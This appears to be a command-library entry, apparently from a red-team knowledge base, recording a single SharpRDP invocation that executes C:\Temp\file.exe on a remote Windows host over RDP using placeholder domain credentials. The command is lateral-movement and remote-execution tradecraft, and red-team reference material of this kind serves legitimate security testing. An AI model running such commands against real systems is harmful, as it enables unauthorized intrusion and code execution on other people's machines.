---
id: f5ccba69-12d4-43b9-95bc-51b4f34134a9
name: Execute file.exe on target computer using SharpRDP
type: command
executor: bash
data: SharpRDP.exe computername=target.domain command="C:\Temp\file.exe" username=domain\user
  password=password
output: null
created_at: '2023-04-06T03:56:31.072529+00:00'
updated_at: '2023-04-10T20:38:03.093770+00:00'
---

# Execute file.exe on target computer using SharpRDP

```bash
SharpRDP.exe computername=target.domain command="C:\Temp\file.exe" username=domain\user password=password
```
